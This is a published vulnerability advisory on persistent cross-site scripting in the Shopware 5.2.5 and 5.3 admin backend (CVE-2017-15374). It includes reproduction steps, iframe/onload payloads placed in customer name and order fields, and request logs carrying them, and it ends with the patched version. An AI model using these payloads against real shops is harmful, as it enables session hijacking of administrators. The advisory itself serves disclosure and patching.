@@ -1,0 +1,335 @@
+Document Title:
+===============
+Shopware 5.2.5 & v5.3 - Multiple Cross Site Scripting Web Vulnerabilities
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1922
+
+Shopware Security Tracking ID: SW-19834
+
+Security Update: 
+http://community.shopware.com/Downloads_cat_448.html#5.3.4
+http://community.shopware.com/_detail_2035.html
+
+http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-15374
+
+CVE-ID:
+=======
+CVE-2017-15374
+
+
+Release Date:
+=============
+2017-09-05
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1922
+
+
+Common Vulnerability Scoring System:
+====================================
+4.4
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+Shopware is a modular online shop system that is since 2004 developed in germany. It is available both as 
+an open source software as well as in commercial editions. The program can be extended in its functions by 
+installing additional plugins. An open API allows third-party systems, such as payment services or ERP 
+systems, to be connected. The system is multi shop capable it can thus be generated within an installation 
+several shops in different domains. A multi-client capability (complete separation of multishops in the 
+administration area) is by default, but can be achieved in the cluster.
+
+(Copy of the Vendor Homepage: https://en.shopware.com/ )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered multiple stored cross site scripting vulnerability in the official Shopware v5.2.5 & 5.3 CMS.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2016-10-07: Researcher Notification & Coordination (Benjamin Kunz Mejri - Evolution Security GmbH)
+2016-10-08: Vendor Notification (Shopware Security Team)
+2016-**-**: Vendor Response/Feedback (Shopware Security Team)
+2017-**-**: Vendor Fix/Patch (Shopware Service Developer Team)
+2017-09-05: Public Disclosure (Vulnerability Laboratory)
+2017-10-25: Security Acknowledgements (Shopware Developer Team)
+2017-10-25: Security Acknowledgements (Shopware Security Team)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Shopware AG
+Product: Shopware - Content Management System (Web-Application) 5.2.5
+
+Shopware AG
+Product: Shopware - Content Management System (Web-Application) 5.3
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Technical Details & Description:
+================================
+The shopware v5.2.5 - v5.3 is vulnerable to cross site scripting in the customer and order section of the content management 
+system backend modules. Remote attackers are able to inject malicious script code to the firstname, lastname or order 
+input fields to provoke a persistent execution in the customer and orders section of the backend. The execution occurs 
+in the shopware administrator backend listing when processing to preview the customers (kunden) or orders (bestellungen).
+The injection can be processed by interaction via user registration or by manipulation of the order information inputs.
+The web issue can be exploited by low privileged user accounts against higher privileged admin- oder moderator-accounts.
+
+The security risk of the bugs are estimated as medium with a cvss (common vulnerability scoring system) count of 4.4. 
+Exploitation of the issue requires a low privileged web-application user account and low or medium user interaction. 
+Successful exploitation of the vulnerabilities results in persistent phishing mails, session hijacking, persistent 
+external redirect to malicious sources and application-side manipulation of affected or connected module context.
+
+Request Method(s):
+[+] POST (Registration)
+[+] POST (Order Item)
+[+] POST (Profile Update)
+
+Vulnerable Input(s):
+[+] Firstname
+[+] Lastname
+[+] Order Name
+
+Affected Module(s):
+[+] Kunden (Customers)
+[+] Bestellungen (Orders)
+
+
+Proof of Concept (PoC):
+=======================
+The cross site vulnerabilities can be exploited by remote attackers with low privileged shopware user account and low user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1.  Open the the browser and surf to the target shopware v5.2.5 web-application
+2.  Move to the registration formular
+3.  Include a script code payload with a iframe src onload tag to the firstname, lastname and name parameters
+4.  Submit the request via POST method to register the account
+5.  Move to the inbox and verify via link the account to activate
+Note: Now the payloads are executable saved to the Kunden (Customer) section in the backend
+6.  The administrator visits in the next step the Kunden (Customer) section to preview
+7.  The script code payload executes in the customers list
+8.  As next step the attacker places an order via shop
+Note: The order name manipulation via registration is as well able to execute script code the context
+9.  The administrator visits in the next step the Bestellungen (orders) section to preview 
+10. The script code payload executes in the orders list
+11. Successful reproduce of the both cross site vulnerabilities!
+
+Note: Attackers are able to inject malicious redirects, frames with payloads or other script code tags.
+The basic web validation filter of the shopware content management system does not encode the list context.
+
+
+PoC: Vulnerable Source (Execution in Orders - Bestellungen)
+<tr class="x-grid-row  x-grid-row-alt"><td class=" x-grid-cell x-grid-cell-gridcolumn-1496  
+x-grid-cell-special x-grid-cell-row-checker x-grid-cell-first"><div class="x-grid-cell-inner " 
+style="text-align: left; ;"><div class="x-grid-row-checker">&nbsp;</div></div></td><td class=" 
+x-grid-cell x-grid-cell-gridcolumn-1428   "><div class="x-grid-cell-inner " style="text-align: left; 
+;">20.08.2016 08:34</div></td><td class=" x-grid-cell x-grid-cell-gridcolumn-1429   
+"><div class="x-grid-cell-inner " style="text-align: left; ;">20044</div></td><td class=" 
+x-grid-cell x-grid-cell-gridcolumn-1430   "><div class="x-grid-cell-inner " style="text-align: left; ;">
+536,80</div></td><td class=" x-grid-cell x-grid-cell-gridcolumn-1431   "><div class="x-grid-cell-inner " 
+style="text-align: left; ;">&nbsp;</div></td><td class=" x-grid-cell x-grid-cell-gridcolumn-1432   ">
+<div class="x-grid-cell-inner " style="text-align: left; ;">Rechnung</div></td><td class=" x-grid-cell 
+x-grid-cell-gridcolumn-1433   "><div class="x-grid-cell-inner " style="text-align: left; ;">Standard Versand</div></td>
+<td class=" x-grid-cell x-grid-cell-gridcolumn-1434   "><div class="x-grid-cell-inner " style="text-align: left; ;">
+Hauptshop Deutsch</div></td><td class=" x-grid-cell x-grid-cell-gridcolumn-1435   "><div class="x-grid-cell-inner " 
+style="text-align: left; ;">Mar'Da>"<iframe src="evil.source" onload="alert("PTEST")[PERSISTENT SCRIPT CODE EXECUTION!]" <="" 
+korat="">"<iframe src=evil.source onload=alert("PTEST")[PERSISTENT SCRIPT CODE EXECUTION!] <</div></td><td class=" x-grid-cell 
+x-grid-cell-gridcolumn-1436 " ><div  class="x-grid-cell-inner " style="text-align: left; ;"><a href="mailto:mardakorat@cuvox.de" 
+data-qtip="mardakorat@cuvox.de">mardakorat@cuvox.de</a></div></td><td class=" x-grid-cell x-grid-cell-gridcolumn-1437   
+" ><div  class="x-grid-cell-inner " style="text-align: left; ;">Offen</div></td><td class=" x-grid-cell 
+x-grid-cell-gridcolumn-1438   " ><div  class="x-grid-cell-inner " style="text-align: left; ;">Offen</div></td>
+<td class=" x-grid-cell x-grid-cell-actioncolumn-1405   x-action-col-cell x-grid-cell-last" >
+<div  class="x-grid-cell-inner " style="text-align: left; ;">
+<img alt="" src="data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" 
+class="x-action-col-icon x-action-col-0  sprite-user " data-qtip="Kunde öffnen" data-action="openCustomer"  />
+<img alt="" src="data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" 
+class="x-action-col-icon x-action-col-1  sprite-minus-circle-frame " data-qtip="Bestellung löschen" 
+data-action="deleteOrder"  /><img alt="" src="data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" 
+class="x-action-col-icon x-action-col-2  sprite-pencil " data-qtip="Zeige Details" data-action="editOrder"  /></div></td></tr>
+<tr class="x-grid-row " ><td class=" x-grid-cell x-grid-cell-gridcolumn-1496  x-grid-cell-special 
+x-grid-cell-row-checker x-grid-cell-first" ><div  class="x-grid-cell-inner " style="text-align: left; ;">
+<div class="x-grid-row-checker">&#160;</div></div></td><td class=" x-grid-cell x-grid-cell-gridcolumn-1428   " >
+<div  class="x-grid-cell-inner " style="text-align: left; ;">19.08.2016 15:50</div></td><td class=" x-grid-cell 
+x-grid-cell-gridcolumn-1429   " ><div  class="x-grid-cell-inner " style="text-align: left; ;">20051</div></td>
+<td class=" x-grid-cell x-grid-cell-gridcolumn-1430   " ><div  class="x-grid-cell-inner " 
+style="text-align: left; ;">308,75</div></td><td class=" x-grid-cell x-grid-cell-gridcolumn-1431   " >
+<div  class="x-grid-cell-inner " style="text-align: left; ;">&#160;</div></td>
+
+
+PoC: Vulnerable Source (Execution in Customers - Kunden)
+<div class="x-window x-customer-detail-window x-layer x-window-default x-closable x-window-closable x-window-default-closable" 
+style="left: 124px; top: 26px; width: 1093px; height: 458px; z-index: 39041;" id="customer-detail-window-2311" tabindex="-1">
+<div style="-moz-user-select: none; left: -1px; top: -1px; width: 1093px;" class="x-window-header x-window-header-draggable 
+x-docked x-window-header-default x-horizontal x-window-header-horizontal x-window-header-default-horizontal x-top 
+x-window-header-top x-window-header-default-top x-docked-top x-window-header-docked-top x-window-header-default-docked-top 
+x-unselectable" id="customer-detail-window-2311_header"><div style="width: 1091px;" id="customer-detail-window-2311_header-body" 
+class="x-window-header-body x-window-header-body-default x-window-header-body-horizontal x-window-header-body-default-horizontal 
+x-window-header-body-top x-window-header-body-default-top x-window-header-body-docked-top x-window-header-body-default-docked-top 
+x-window-header-body-default-horizontal x-window-header-body-default-top x-window-header-body-default-docked-top x-box-layout-ct">
+<div style="width: 1066px; height: 154px;" id="customer-detail-window-2311_header-innerCt" class="x-box-inner " 
+role="presentation"><div id="customer-detail-window-2311_header-targetEl" style="position:absolute;width:20000px;
+left:0px;top:0px;height:1px"><div class="x-component x-window-header-text-container x-box-item x-component-default" 
+style="text-align: left; left: 0px; top: 0px; margin: 0px; width: 1049px;" id="customer-detail-window-2311_header_hd">
+<span id="customer-detail-window-2311_header_hd-textEl" class="x-window-header-text x-window-header-text-default">
+Kundenkonto: Mar'Da"><iframe src="evil.source" onload="alert("PTEST")[PERSISTENT SCRIPT CODE EXECUTION!]" <="" 
+korat"=""><iframe src=evil.source onload=alert("PTEST")[PERSISTENT SCRIPT CODE EXECUTION!] < (20019)</iframe></span></div>
+<div class="x-tool x-box-item x-tool-default" style="width: 15px; height: 15px; left: 1051px; top: 70px; margin: 0px;" id="tool-2312">
+<img id="tool-2312-toolEl" src="data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" 
+class="x-tool-close" role="presentation"></div></div></div></div>
+
+
+--- PoC Session Logs [POST] ---
+Status: 200[OK]
+POST http://shopware.localhost:8080/backend/customer/save?_dc=1471541475086&customerID=22 
+Mime Type[application/json]
+   Request Header:
+      Host[shopware.localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.2; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]
+      Content-Type[application/json]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://shopware.localhost:8080/backend/]
+      Cookie[SHOPWAREBACKEND=fv4u2kg63p3ff3ht6kd6var803; test; x-ua-device=desktop; session-1=e7f8815a87d6cfa5552abf58325ca4fa184f7b69f9d45ff7b101c17f7ee0a255;]
+Connection[keep-alive]
+POST-Daten:
+{"id":22,"groupKey":"EK","email":"TEST@TEST.de","active":true,"accountMode":0,"confirmationKey":
+"","paymentId":5,"firstLogin":"2016-08-18T00:00:00","lastLogin":"2016-08-18T17:22:23","newsletter":0,"validation":0,"
+languageId":1,"shopId":1,"priceGroupId":0,
+"internalComment":"TEST-comment","failedLogins":0,"referer":"","default_billing_address_id":22,"
+default_shipping_address_id":22,
+"newPassword":"","amount":402.9,"orderCount":1,"canceledOrderAmount": 0,"shopName":"Hauptshop Deutsch","language":"Deutsch","birthday":"16.05.1985","title":"","
+salutation":"mr","firstname":"TEST[INJECTED SCRIPT CODE]>"<iframe src=./evi.source onload=alert(document.cookie) <","
+lastname":"TEST[INJECTED SCRIPT CODE]>"<iframe src=./evi.source onload=alert(document.cookie) <",
+"number":"20028","billing":[{"id":22,"salutation":"mr","company":"","
+department":"","firstName":"TEST[INJECTED SCRIPT CODE]>"<iframe src=./evi.source onload=alert
+(document.cookie) <","title":"","lastName":"TEST[INJECTED SCRIPT CODE]>"<iframe src=./evi.source onload=alert(document.cookie) <",
+"street":"Teststrau00dfe","zipCode":"72202","city":"Nagold","additionalAddressLine1":"","additionalAddressLine2":"",
+"salutationSnippet":"Herr","countryId":2,"number":"","phone":"","vat
+Id":"","stateId":null}],"shipping":[{"id":23,"salutation":"mr","company":"","department":"",
+"firstName":"TEST[INJECTED SCRIPT CODE]>"<iframe src=./evi.source 
+onload=alert(document.cookie) <","title":"",
+"lastName":"TEST[INJECTED SCRIPT CODE]>"<iframe src=./evi.source onload=alert(document.cookie) <",
+"street":"Teststrau00dfe","zipCode":"72202","city":"Nagold","additionalAddressLine1":"",
+"additionalAddressLine2":"","salutationSnippet":"Herr","countryId":2,"stateId":null}],"debit":
+[],"paymentData":[{"accountNumber":"","bankCode":"","bankName":"","accountHolder":"","bic":"",
+"iban":"","useBillingData":false,"id":null}]}]
+   Response Header:
+      Server[nginx/1.8.1]
+      Content-Type[application/json]
+      Connection[keep-alive]
+      Set-Cookie[SHOPWAREBACKEND=88g31dgs8lem6cun3ldjq4l3f2; path=/backend/; HttpOnly]
+-
+Status: 200[OK]
+POST http://shopware.localhost:8080/backend/Log/createLog
+Mime Type
+[application/json]
+   Request Header:
+      Host[shopware.localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.2; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]
+      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://shopware.localhost:8080/backend/]
+      Cookie[SHOPWAREBACKEND=88g31dgs8lem6cun3ldjq4l3f2; test; x-ua-device=desktop; 
+	session-1=e7f8815a87d6cfa5552abf58325ca4fa184f7b69f9d45ff7b101c17f7ee0a255;]
+      Connection[keep-alive]
+   POST-Daten:
+      type[backend]
+      key[Kunden]
+      text[Kunde%2020028%20wurde%20gespeichert]
+      user[Demo-Admin]
+      value4[]
+   Response Header:
+      Server[nginx/1.8.1]
+      Content-Type[application/json]
+      Connection[keep-alive]
+      Set-Cookie[SHOPWAREBACKEND=hmb3lqokn3bkr6kvpo1o6vi4o6; path=/backend/; HttpOnly]
+-
+Status: 200[OK]
+GET http://shopware.localhost:8080/backend/evil.source[PERSISTENT SCRIPT CODE EXECUTE!] 
+Mime Type[text/html]
+   Request Header:
+      Host[shopware.localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.2; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]
+      Referer[http://shopware.localhost:8080/backend/]
+      Cookie[SHOPWAREBACKEND=p56ursgfdc6f1tbh0s35detvc5; test; x-ua-device=desktop; 
+	session-1=e7f8815a87d6cfa5552abf58325ca4fa184f7b69f9d45ff7b101c17f7ee0a255;]
+      Connection[keep-alive]
+   Response Header:
+      Server[nginx/1.8.1]
+      Content-Type[text/html; charset=UTF-8]
+      Connection[keep-alive]
+      Set-Cookie[SHOPWAREBACKEND=v3mhes99ai1hsolj8vddjkbci2; path=/backend/; HttpOnly]
+
+
+Reference(s):
+http://shopware.localhost:8080/
+http://shopware.localhost:8080/backend/
+http://shopware.localhost:8080/backend/Log/
+http://shopware.localhost:8080/backend/customer/
+http://shopware.localhost:8080/backend/Log/createLog
+http://shopware.localhost:8080/backend/customer/save
+http://shopware.localhost:8080/backend/AttributeData/
+http://shopware.localhost:8080/backend/AttributeData/list
+
+
+Solution - Fix & Patch:
+=======================
+The xss vulnerability can be patched by a secure parse of the customer (kunden) and orders (bestellungen) context listings.
+Parse or escape the context and disallow special chars during the registration or add to prevent further script code injection attacks.
+
+The vulnerability can be resolved by an update to version 5.3.4 that is delivered by the manufacturer. The issue risk is marked as moderate.
+
+
+
+Security Risk:
+==============
+The security risk of the stored cross site scripting vulnerabilities in the shopware cms are estimated as medium. (CVSS 4.4)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri [http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or 
+implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any 
+case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its 
+suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
+or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface 
+websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories 
+or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails, 
+phone numbers, conversations or anything else to journalists, investigative authorities or private individuals.
